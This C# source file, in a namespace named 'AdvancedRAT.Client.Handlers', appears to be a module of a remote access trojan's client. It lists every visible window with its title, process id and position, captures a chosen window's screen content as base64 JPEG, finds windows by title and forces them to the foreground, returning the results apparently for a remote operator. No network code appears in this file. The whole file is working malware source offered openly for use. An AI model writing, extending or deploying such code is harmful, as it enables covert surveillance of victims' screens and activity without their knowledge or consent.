using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace AdvancedRAT.Client.Handlers
{
    public class WindowCaptureHandler
    {
        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private const int SW_RESTORE = 9;
        private const int SW_SHOW = 5;

        public async Task<object> GetWindowList()
        {
            try
            {
                var windows = new List<Dictionary<string, string>>();

                EnumWindows((hWnd, lParam) =>
                {
                    if (IsWindowVisible(hWnd))
                    {
                        int length = GetWindowTextLength(hWnd);
                        if (length > 0)
                        {
                            var sb = new StringBuilder(length + 1);
                            GetWindowText(hWnd, sb, sb.Capacity);
                            string title = sb.ToString();

                            if (!string.IsNullOrWhiteSpace(title))
                            {
                                RECT rect = new RECT();
                                GetWindowRect(hWnd, ref rect);

                                GetWindowThreadProcessId(hWnd, out uint processId);

                                windows.Add(new Dictionary<string, string>
                                {
                                    ["Handle"] = hWnd.ToString(),
                                    ["Title"] = title,
                                    ["ProcessId"] = processId.ToString(),
                                    ["Left"] = rect.Left.ToString(),
                                    ["Top"] = rect.Top.ToString(),
                                    ["Width"] = (rect.Right - rect.Left).ToString(),
                                    ["Height"] = (rect.Bottom - rect.Top).ToString()
                                });
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);

                return new { success = true, windows, count = windows.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> CaptureWindow(string handleStr)
        {
            try
            {
                IntPtr hWnd = new IntPtr(long.Parse(handleStr));

                if (!IsWindowVisible(hWnd))
                {
                    return new { success = false, message = "Window is not visible" };
                }

                RECT rect = new RECT();
                GetWindowRect(hWnd, ref rect);

                int width = rect.Right - rect.Left;
                int height = rect.Bottom - rect.Top;

                if (width <= 0 || height <= 0)
                {
                    return new { success = false, message = "Invalid window size" };
                }

                using (Bitmap bitmap = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(width, height));
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);

                        return new 
                        { 
                            success = true, 
                            image = base64,
                            width,
                            height,
                            format = "jpeg"
                        };
                    }
                }
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> ActivateWindow(string handleStr)
        {
            try
            {
                IntPtr hWnd = new IntPtr(long.Parse(handleStr));

                if (!IsWindowVisible(hWnd))
                {
                    ShowWindow(hWnd, SW_RESTORE);
                }

                bool result = SetForegroundWindow(hWnd);

                return new 
                { 
                    success = result, 
                    message = result ? "Window activated" : "Failed to activate window"
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> GetActiveWindow()
        {
            try
            {
                IntPtr hWnd = GetForegroundWindow();

                if (hWnd == IntPtr.Zero)
                {
                    return new { success = false, message = "No active window" };
                }

                var sb = new StringBuilder(256);
                GetWindowText(hWnd, sb, sb.Capacity);
                string title = sb.ToString();

                RECT rect = new RECT();
                GetWindowRect(hWnd, ref rect);

                GetWindowThreadProcessId(hWnd, out uint processId);

                return new 
                { 
                    success = true,
                    handle = hWnd.ToString(),
                    title,
                    processId = processId.ToString(),
                    left = rect.Left,
                    top = rect.Top,
                    width = rect.Right - rect.Left,
                    height = rect.Bottom - rect.Top
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> FindWindow(string titlePattern)
        {
            try
            {
                var windows = new List<Dictionary<string, string>>();

                EnumWindows((hWnd, lParam) =>
                {
                    if (IsWindowVisible(hWnd))
                    {
                        int length = GetWindowTextLength(hWnd);
                        if (length > 0)
                        {
                            var sb = new StringBuilder(length + 1);
                            GetWindowText(hWnd, sb, sb.Capacity);
                            string title = sb.ToString();

                            if (!string.IsNullOrWhiteSpace(title) && 
                                title.Contains(titlePattern, StringComparison.OrdinalIgnoreCase))
                            {
                                RECT rect = new RECT();
                                GetWindowRect(hWnd, ref rect);

                                GetWindowThreadProcessId(hWnd, out uint processId);

                                windows.Add(new Dictionary<string, string>
                                {
                                    ["Handle"] = hWnd.ToString(),
                                    ["Title"] = title,
                                    ["ProcessId"] = processId.ToString(),
                                    ["Left"] = rect.Left.ToString(),
                                    ["Top"] = rect.Top.ToString(),
                                    ["Width"] = (rect.Right - rect.Left).ToString(),
                                    ["Height"] = (rect.Bottom - rect.Top).ToString()
                                });
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);

                return new { success = true, windows, count = windows.Count, pattern = titlePattern };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
